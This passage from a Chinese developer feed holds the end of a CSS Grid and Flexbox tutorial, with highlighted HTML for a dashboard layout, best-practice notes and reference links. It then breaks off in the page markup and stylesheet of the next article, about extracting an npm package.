        <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"menu-item"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>👥 用户管理<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"menu-item"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>⚙️ 系统设置<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"menu-item"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>📝 日志记录<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">aside</span>&gt;</span>
    
    <span class="hljs-comment">&lt;!-- 主要内容区域 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">main</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"main"</span>&gt;</span>
      <span class="hljs-comment">&lt;!-- 数据概览卡片 --&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"overview-cards"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"overview-card"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-icon primary"</span>&gt;</span>📊<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-info"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>12,345<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>总访问量<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"overview-card"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-icon success"</span>&gt;</span>💰<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-info"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>¥45,678<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>总收入<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"overview-card"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-icon warning"</span>&gt;</span>👥<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-info"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>789<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>活跃用户<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"overview-card"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-icon danger"</span>&gt;</span>📱<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-info"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>45.6%<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>移动端占比<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      
      <span class="hljs-comment">&lt;!-- 主要图表 --&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"main-chart"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>主要指标趋势<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"chart-placeholder"</span>&gt;</span>
          图表区域（可替换为实际图表库：Chart.js、ECharts等）
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      
      <span class="hljs-comment">&lt;!-- 辅助数据卡片 --&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"secondary-cards"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"secondary-card"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>用户增长趋势<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-placeholder"</span>&gt;</span>用户增长图表<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"secondary-card"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>销售数据统计<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-placeholder"</span>&gt;</span>销售数据图表<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      
      <span class="hljs-comment">&lt;!-- 数据表格 --&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"data-table"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>最新订单<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">table</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">thead</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>订单号<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>用户<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>金额<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>状态<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>日期<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">thead</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">tbody</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>#12345<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>张三<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>¥1,234<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>已完成<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>2024-01-15<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>#12344<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>李四<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>¥567<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>处理中<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>2024-01-15<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>#12343<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>王五<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>¥890<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>已完成<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>2024-01-14<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>#12342<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>赵六<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>¥2,345<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>已取消<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>2024-01-14<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>#12341<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>孙七<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>¥678<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>已完成<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>2024-01-13<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">tbody</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">main</span>&gt;</span>
    
    <span class="hljs-comment">&lt;!-- 右侧信息栏 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">aside</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"rightbar"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"widget"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"widget-title"</span>&gt;</span>最近活动<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"widget-content"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>• 用户张三登录系统<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>• 订单 #12345 已完成<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>• 新用户注册：李四<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>• 系统更新成功<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"widget"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"widget-title"</span>&gt;</span>快速链接<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"widget-content"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>创建新订单<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>用户管理<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>数据分析<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>系统设置<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"widget"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"widget-title"</span>&gt;</span>系统状态<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"widget-content"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>服务器状态：正常<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>数据库连接：正常<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>在线用户：123<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>系统负载：23%<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">aside</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p>在这个复杂仪表板示例中，我们：</p>
<ul>
<li>使用 <strong>CSS Grid</strong> 实现了整体的页面布局结构（三栏布局：侧边栏、主内容、右侧信息栏）</li>
<li>使用 <strong>Flexbox</strong> 实现了组件内部的对齐和分布（导航栏、概览卡片、菜单等）</li>
<li>结合了两种布局技术的优势，创建了复杂而灵活的响应式界面</li>
<li>使用媒体查询实现了不同屏幕尺寸下的布局适配</li>
</ul>
<h3 data-id="heading-11">⚠️ 注意事项和最佳实践</h3>
<h4 data-id="heading-12">1. 选择合适的布局技术</h4>
<ul>
<li><strong>一维布局</strong>（行或列）：优先使用 Flexbox</li>
<li><strong>二维布局</strong>（需要同时控制行和列）：优先使用 CSS Grid</li>
<li><strong>复杂嵌套布局</strong>：结合使用 Grid 和 Flexbox</li>
</ul>
<h4 data-id="heading-13">2. 避免过度使用</h4>
<ul>
<li>不要在所有情况下都同时使用 Grid 和 Flexbox</li>
<li>根据实际需求选择最合适的布局技术</li>
<li>保持布局的简洁性和可维护性</li>
</ul>
<h4 data-id="heading-14">3. 性能优化</h4>
<ul>
<li>避免过深的布局嵌套</li>
<li>减少 CSS 选择器的复杂性</li>
<li>使用 <code>auto-fit</code> 和 <code>auto-fill</code> 等关键字实现灵活的网格布局</li>
<li>避免不必要的重排和重绘</li>
</ul>
<h4 data-id="heading-15">4. 响应式设计</h4>
<ul>
<li>使用媒体查询适配不同屏幕尺寸</li>
<li>利用 Grid 的 <code>minmax()</code> 和 <code>repeat()</code> 函数实现自适应布局</li>
<li>使用 Flexbox 的 <code>flex-wrap</code> 属性处理元素的换行</li>
</ul>
<h4 data-id="heading-16">5. 浏览器兼容性</h4>
<ul>
<li>CSS Grid 在现代浏览器中得到广泛支持，但在旧版浏览器（如 IE 11）中支持有限</li>
<li>Flexbox 在所有现代浏览器中都有良好的支持</li>
<li>如果需要支持旧版浏览器，可以使用 CSS Grid 的 <code>grid-template-areas</code> 和 <code>grid-area</code> 属性，这些属性在 IE 11 中有基本支持</li>
</ul>
<h3 data-id="heading-17">📝 总结</h3>
<p>通过结合使用 CSS Grid 和 Flexbox，我们可以：</p>
<ol>
<li><strong>实现复杂布局</strong>：快速构建传统布局技术难以完成的复杂界面</li>
<li><strong>提高开发效率</strong>：减少布局嵌套层级，简化代码结构</li>
<li><strong>增强响应式能力</strong>：更好地适配各种屏幕尺寸和设备</li>
<li><strong>提升用户体验</strong>：创建更加灵活和直观的界面布局</li>
<li><strong>优化代码可维护性</strong>：分离布局结构和内容，便于后续修改和扩展</li>
</ol>
<p>在实际项目中，我们应该根据具体需求选择合适的布局技术，合理搭配使用 CSS Grid 和 Flexbox，发挥它们各自的优势，创建高效、灵活、可维护的前端布局。</p>
<p>希望这个小技巧对你有所帮助！如果你有任何问题或建议，欢迎在评论区留言讨论 🤗</p>
<hr/>
<p><strong>相关资源：</strong></p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FCSS%2FCSS_Grid_Layout" target="_blank" title="https://developer.mozilla.org/zh-CN/docs/Web/CSS/CSS_Grid_Layout" ref="nofollow noopener noreferrer">CSS Grid 官方文档</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FCSS%2FCSS_Flexible_Box_Layout" target="_blank" title="https://developer.mozilla.org/zh-CN/docs/Web/CSS/CSS_Flexible_Box_Layout" ref="nofollow noopener noreferrer">Flexbox 官方文档</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcss-tricks.com%2Fcss-grid-vs-flexbox%2F" target="_blank" title="https://css-tricks.com/css-grid-vs-flexbox/" ref="nofollow noopener noreferrer">CSS Grid vs Flexbox：何时使用哪个？</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FLearn%2FCSS%2FCSS_layout" target="_blank" title="https://developer.mozilla.org/zh-CN/docs/Learn/CSS/CSS_layout" ref="nofollow noopener noreferrer">MDN - CSS 布局指南</a></li>
</ul>
<p><strong>标签：</strong> #CSS #Grid #Flexbox #响应式设计 #前端布局</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[全栈项目实践五：抽离npm包]]></title>    <link>https://juejin.cn/post/7581378364082618414</link>    <guid>https://juejin.cn/post/7581378364082618414</guid>    <pubDate>2025-12-09T02:05:17.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581378364082618414" data-draft-id="7581279471746646050" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="全栈项目实践五：抽离npm包"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-12-09T02:05:17.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="全_"/> <meta itemprop="url" content="https://juejin.cn/user/2648040071248845"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            全栈项目实践五：抽离npm包
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2648040071248845/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    全_
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T02:05:17.000Z" title="Tue Dec 09 2025 02:05:17 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul 